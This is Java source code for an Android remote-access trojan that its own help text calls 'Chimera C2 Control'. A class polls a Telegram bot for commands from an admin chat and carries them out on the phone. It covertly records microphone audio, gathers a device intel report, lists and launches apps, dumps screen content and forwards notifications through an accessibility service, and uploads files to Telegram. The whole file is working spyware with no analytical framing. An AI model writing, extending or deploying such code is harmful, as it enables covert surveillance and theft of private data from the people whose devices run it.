package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;
    private boolean isWaitingForPackageName = false;

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                pollForUpdates();
                Thread.sleep(3000);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
                try {
                    Thread.sleep(30000);
                } catch (InterruptedException interruptedException) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
    }

    private void pollForUpdates() {
        HttpURLConnection conn = null;
        try {
            String token = ConfigLoader.getBotToken();
            long adminId = ConfigLoader.getAdminId();
            if (token == null || adminId == 0) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
            if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(25000);
            conn.setReadTimeout(25000);
            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;
            InputStream is = conn.getInputStream();
            ByteArrayOutputStream result = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
            String responseStr = result.toString("UTF-8");
            is.close();
            JSONObject responseJson = new JSONObject(responseStr);
            if (!responseJson.getBoolean("ok")) return;
            JSONArray updates = responseJson.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                if (update.has("message")) {
                    handleMessage(update.getJSONObject("message"));
                } else if (update.has("callback_query")) {
                    handleCallback(update.getJSONObject("callback_query"));
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void handleMessage(JSONObject msg) {
        try {
            if (!msg.has("text")) return;
            String text = msg.getString("text");
            long chatId = msg.getJSONObject("chat").getLong("id");
            if (chatId != ConfigLoader.getAdminId()) return;

            if (isWaitingForPackageName) {
                isWaitingForPackageName = false;
                PackageManager pm = context.getPackageManager();
                try {
                    Intent launchIntent = pm.getLaunchIntentForPackage(text);
                    if (launchIntent != null) {
                        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(launchIntent);
                        sendMessage("App launched: " + text, context);
                    } else {
                        sendMessage("Error: Could not get launch intent for package " + text, context);
                    }
                } catch (Exception e) {
                    sendMessage("Error launching app: " + e.getMessage(), context);
                }
                return;
            }

            String[] parts = text.split(" ");
            String command = parts[0].toLowerCase();
            switch (command) {
                case "/start":
                case "/help":
                    sendHelpMessage(chatId);
                    break;
                case "/control":
                    sendControlPanel(chatId);
                    break;
                case "/mic":
                    int duration = 30;
                    if (parts.length > 1) {
                        try {
                            duration = Integer.parseInt(parts[1]);
                        } catch (NumberFormatException ignored) {}
                    }
                    final int finalDuration = duration;
                    sendMessage("Recording " + finalDuration + " seconds of audio...", context);
                    AudioHandler.startRecording(context, finalDuration, new AudioHandler.AudioCallback() {
                        @Override
                        public void onRecordingFinished(String filePath) {
                            uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio Recording", context);
                        }
                        @Override
                        public void onError(String error) {
                            sendMessage("Audio Error: " + error, context);
                        }
                    });
                    break;
                case "/device_details":
                    sendMessage("Gathering device intelligence...", context);
                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
        }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
            int messageId = cb.getJSONObject("message").getInt("message_id");

            if (!ChimeraAccessibilityService.isServiceEnabled() && data.startsWith("ACC_")) {
                sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
                return;
            }

            switch (data) {
                case "LIST_APPS":
                    listAllApps();
                    break;
                case "LAUNCH_APP":
                    isWaitingForPackageName = true;
                    sendMessage("Please reply with the package name of the app to launch (e.g., com.android.chrome)", context);
                    break;
                case "ACC_GESTURES":
                    sendGesturePanel(chatId, messageId);
                    break;
                case "ACC_GET_NOTIFS":
                    sendMessage("Notification listener is active. New notifications will be forwarded.", context);
                    break;
                case "ACC_GET_CONTENT":
                    sendMessage("Dumping screen content...", context);
                    String content = ChimeraAccessibilityService.getScreenContent();
                    sendMessage(content, context);
                    break;
                case "ACC_ACTION_BACK":
                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    answerCallbackQuery(cb.getString("id"), "Back action performed", context);
                    break;
                case "ACC_ACTION_HOME":
                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    answerCallbackQuery(cb.getString("id"), "Home action performed", context);
                    break;
                case "ACC_ACTION_RECENTS":
                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    answerCallbackQuery(cb.getString("id"), "Recents action performed", context);
                    break;
                case "EXIT_PANEL":
                    editMessage(chatId, messageId, "Control panel closed.", context);
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
        }
    }

    private void listAllApps() {
        new Thread(() -> {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder appList = new StringBuilder("--- Installed Apps ---\n");
            for (ApplicationInfo app : packages) {
                appList.append(app.packageName).append("\n");
            }
            sendMessage(appList.toString(), context);
        }).start();
    }
    
    private void sendHelpMessage(long chatId) {
        String helpText = "Chimera C2 Control\n\n"
                + "/control - Show the main control panel.\n"
                + "/mic <seconds> - Record audio.\n"
                + "/device_details - Get device intel report.\n"
                + "/help - Show this message.";
        sendMessage(helpText, context);
    }

    private void sendControlPanel(long chatId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "List All Apps").put("callback_data", "LIST_APPS"))
                .put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP"))
            );
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Gestures (Back/Home)").put("callback_data", "ACC_GESTURES"))
                .put(new JSONObject().put("text", "Get Notifications").put("callback_data", "ACC_GET_NOTIFS"))
            );
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT"))
            );
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL"))
            );
            keyboard.put("inline_keyboard", rows);
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", "Chimera Control Panel");
            body.put("reply_markup", keyboard);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendControlPanel", e);
        }
    }

    private void sendGesturePanel(long chatId, int messageId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Back").put("callback_data", "ACC_ACTION_BACK"))
                .put(new JSONObject().put("text", "Home").put("callback_data", "ACC_ACTION_HOME"))
                .put(new JSONObject().put("text", "Recents").put("callback_data", "ACC_ACTION_RECENTS"))
            );
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN"))
            );
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, keyboard, context);
        } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_SendGesturePanel", e);
        }
    }

    private static void editMessage(long chatId, int messageId, String text, Context context) {
         try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("message_id", messageId);
            body.put("text", text);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/editMessageText", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_EditMessage", e);
        }
    }
    
    private static void editMessageMarkup(long chatId, int messageId, JSONObject markup, Context context) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("message_id", messageId);
            body.put("reply_markup", markup);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/editMessageReplyMarkup", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_EditMarkup", e);
        }
    }

    private static void answerCallbackQuery(String callbackQueryId, String text, Context context) {
        try {
            JSONObject body = new JSONObject();
            body.put("callback_query_id", callbackQueryId);
            body.put("text", text);
            body.put("show_alert", false);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/answerCallbackQuery", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_AnswerCallback", e);
        }
    }

    public static void sendMessage(String message, Context context) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", message);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMessageHelper", e);
        }
    }

    public static void post(String urlStr, String jsonBody, Context context) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    public static void uploadPhoto(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendPhoto", "photo", "image/jpeg");
    }

    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
    }

    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
        final File fileToUpload = new File(filePath);
        if (!fileToUpload.exists()) return;
        new Thread(() -> {
            String token = ConfigLoader.getBotToken();
            if (token == null) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
            String boundary = "Boundary-" + System.currentTimeMillis();
            String LINE_FEED = "\r\n";
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);
                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED);
                    writer.append(String.valueOf(chatId)).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED);
                    writer.append(caption).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED);
                    writer.flush();
                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }
                    writer.append(LINE_FEED).flush();
                    writer.append("--" + boundary + "--").append(LINE_FEED);
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Upload", e);
            } finally {
                if (conn != null) conn.disconnect();
                fileToUpload.delete();
            }
        }).start();
    }
}